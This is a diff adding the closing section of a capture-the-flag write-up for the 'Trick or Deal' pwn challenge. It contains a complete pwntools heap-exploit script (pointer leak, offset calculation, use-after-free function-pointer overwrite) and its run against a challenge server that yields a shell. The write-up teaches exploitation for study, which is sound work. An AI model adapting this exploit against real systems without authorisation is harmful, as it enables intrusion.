@@ -521,9 +521,232 @@ The pointer will be considered as part of the string and will be printed when we
 {{< /rawhtml >}}
 
 
+### Calculate the Offset
+
+First, let's use *gdb* to see the address of each function.
 
 {{< rawhtml >}}
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>p printStorage 
+$1 = {&lt;text variable, no debug info&gt;} <font color="#66D9EF">0x555555400be6</font> &lt;<font color="#F4BF75">printStorage</font>&gt;
+<font color="#F92672"><b>pwndbg&gt; </b></font>p unlock_storage 
+$2 = {&lt;text variable, no debug info&gt;} <font color="#66D9EF">0x555555400eff</font> &lt;<font color="#F4BF75">unlock_storage</font>&gt;
+</code></pre></div>
+{{< /rawhtml >}}
+
+
+Now, let's calculate the offset between the two function with *python*.
+
+{{< rawhtml >}}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">$ python3
+Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
+>>> hex(0x555555400eff - 0x555555400be6)
+'0x319'
+</code></pre></div>
+{{< /rawhtml >}}
+
+Now we just have to add this value to the leaked pointer to calculate the address of `unlock_storage()`.
+Let's add this to our exploit script.
+
+```python3
+leak = u64(io.readline()[:6] + b'\x00\x00')
+log.info(f"printStorage leak: {hex(leak)}")
+
+unlock_storage = leak + 0x319
+log.info(f"unlock_storage: {hex(unlock_storage)}")
+
+io.interactive()
+```
+
+### Overwrite the function pointer
+
+Now we can overwrite the pointer to `printStorage()` with a pointer to `unlock_storage()`.
+
+Let's *free()* the buffer using our helper function, then fill it with *0x48* chars and overwrite the function pointer.
+
+```Python3
+# overwrite printStorage with unlock_storage
+free()
+
+payload = b'V' * 0x48 + p64(unlock_storage)
+malloc(0x50, payload)
+```
+
+Our heap look like this now.
+
+{{< rawhtml >}}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#F92672"><b>pwndbg&gt; </b></font>vis 1 0x555555603290
+
+0x555555603290  <font color="#F4BF75">0x0000000000000000</font> <font color="#A1EFE4">0x0000000000000061</font> <font color="#A1EFE4">........a.......</font>
+0x5555556032a0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">VVVVVVVVVVVVVVVV</font>
+0x5555556032b0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">VVVVVVVVVVVVVVVV</font>
+0x5555556032c0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">VVVVVVVVVVVVVVVV</font>
+0x5555556032d0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">VVVVVVVVVVVVVVVV</font>
+0x5555556032e0  <font color="#A1EFE4">0x5656565656565656</font> <font color="#A1EFE4">0x0000555555400eff</font> <font color="#A1EFE4">VVVVVVVV..@UUU..</font>
+0x5555556032f0  <font color="#A1EFE4">0x0000000000000000</font> <font color="#AE81FF">0x0000000000020d11</font> <font color="#AE81FF">................</font>  &lt;-- Top chun
+</code></pre></div>
+{{< /rawhtml >}}
+
+### Call `unlock_storage()`
+
+All that's left to do, is to call the function pointer, with the first action.
+
+{{< rawhtml >}}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">[*] What do you want to do? <font color="#F92672"><b>$</b></font> 1
+
+<blink><font color="#A6E22E">[*] Bruteforcing Storage Access Code . . .</font></blink>
+
+<font color="#A6E22E"><b>* Storage Door Opened *</b></font>
+<font color="#F92672"><b>$</b></font> id
+uid=1000(kali) gid=1000(kali) groups=1000(kali)
+</code></pre></div>
+{{< /rawhtml >}}
+
+Add this ultimate step, and we have a complete exploit.
+
+```python3
+io.sendlineafter(b'[*] What do you want to do? ', b'1')
+
+io.interactive()
+```
+
+### Remote option
+
+It's nice to have a REMOTE option to target the ctf server. I generally modify the `start()` function of the exploit script with this option.
+
+```python3
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+
+    elif args.REMOTE: # ('server:port')
+        return remote(sys.argv[1].split(':')[0], sys.argv[1].split(':')[1])
+
+    else:
+        return process([exe.path] + argv, *a, **kw)
+```
+
+## Final
+
+Below the full exploit script.
+
+```Python3
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template trick_or_deal
+from pwn import *
+
+context.terminal = ['tilix', '--action=session-add-right', '-e']
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('trick_or_deal')
+
+# Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+
+    elif args.REMOTE: # ('server:port')
+        return remote(sys.argv[1].split(':')[0], sys.argv[1].split(':')[1])
+
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+set glibc 2.31
+#tbreak main
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Full RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+# RUNPATH:  b'./glibc/'
+
+
+# Helper functions
+
+def free():
+    io.recvuntil(b'[*] What do you want to do?')
+    io.sendline(b'4')
+
+def malloc(size, data):
+    io.sendafter(b'[*] What do you want to do?', b'3\n')
+    io.sendafter(b'[*] Are you sure that you want to make an offer(y/n): ', b'y\n')
+    
+    io.sendafter(b'[*] How long do you want your offer to be?', f"{size}".encode())
+    io.sendafter(b'[*] What can you offer me? ', data)
+
+
+# Exploit code
+
+io = start()
+
+free()
+
+# We don't overwrite the function pointer so that we can leak it.
+payload = 0x48 * b'Y'
+malloc(0x58, payload)
+
+# Leak pointer
+io.sendlineafter(b'[*] What do you want to do? ', b'1')
+io.recvuntil(b'Y' * 0x48)
+
+leak = u64(io.readline()[:6] + b'\x00\x00')
+log.info(f"printStorage leak: {hex(leak)}")
+
+unlock_storage = leak + 0x319
+log.info(f"unlock_storage: {hex(unlock_storage)}")
+
+# overwrite printStorage with unlock_storage
+free()
+
+payload = b'V' * 0x48 + p64(unlock_storage)
+malloc(0x50, payload)
+
+io.sendlineafter(b'[*] What do you want to do? ', b'1')
+
+io.sendline(b'id')
+io.interactive()
+```
+
+Let's attack the remote server.
+
+{{< rawhtml >}}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;">$ ./xpl.py REMOTE 64.227.46.56:32650
+[<font color="#66D9EF"><b>*</b></font>] &apos;/home/olivier/projets/hackthebox/challenge/pwn/Trick_or_Deal/trick_or_deal&apos;
+    Arch:     amd64-64-little
+    RELRO:    <font color="#A6E22E">Full RELRO</font>
+    Stack:    <font color="#A6E22E">Canary found</font>
+    NX:       <font color="#A6E22E">NX enabled</font>
+    PIE:      <font color="#A6E22E">PIE enabled</font>
+    RUNPATH:  <font color="#F92672">b&apos;./glibc/&apos;</font>
+[<font color="#A6E22E"><b>+</b></font>] Opening connection to 64.227.46.56 on port 32650: Done
+[<font color="#66D9EF"><b>*</b></font>] printStorage leak: 0x559901e00be6
+[<font color="#66D9EF"><b>*</b></font>] unlock_storage: 0x559901e00eff
+[<font color="#66D9EF"><b>*</b></font>] Switching to interactive mode
+
+<blink><font color="#A6E22E">[*] Bruteforcing Storage Access Code . . .</font></blink>
+
+<font color="#A6E22E"><b>* Storage Door Opened *</b></font>
+uid=999(ctf) gid=999(ctf) groups=999(ctf)
+<font color="#F92672"><b>$</b></font> ls
+flag.txt  glibc  ld-2.31.so  libc-2.31.so  trick_or_deal
 </code></pre></div>
 {{< /rawhtml >}}
 
